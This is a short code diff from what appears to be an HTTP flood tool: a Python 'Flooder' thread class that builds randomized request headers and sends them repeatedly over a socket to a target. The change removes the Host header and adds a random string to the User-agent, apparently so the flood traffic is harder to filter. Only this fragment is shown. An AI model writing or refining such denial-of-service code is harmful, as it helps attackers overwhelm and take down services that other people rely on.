@@ -30,7 +30,6 @@ class Flooder(threading.Thread):
                 q1 = str(round(random.uniform(0.5, 0.7), 1))
                 q2 = str(round(random.uniform(0.7, 1), 1))
                 cur_header = {
-                    "Host": " " + str(target.netloc),
                     "Content-type": "application/x-www-form-urlencoded",
                     "Accept": "text/plain; q=" + q1 + ", text/html, "
                                                       "text/x-dvi; q=" + q2 + "; mxb=100000, text/x-c",
@@ -38,7 +37,7 @@ class Flooder(threading.Thread):
                     "Connection": "Keep-Alive",
                     "Cache-Control": "no-cache",
                     "Pragma": "no-cache",
-                    "User-agent": user_agent,
+                    "User-agent": user_agent + randstr,
                     "Accept-Encoding": "gzip,deflate"
                 }
                 sock.sendall(str.encode(
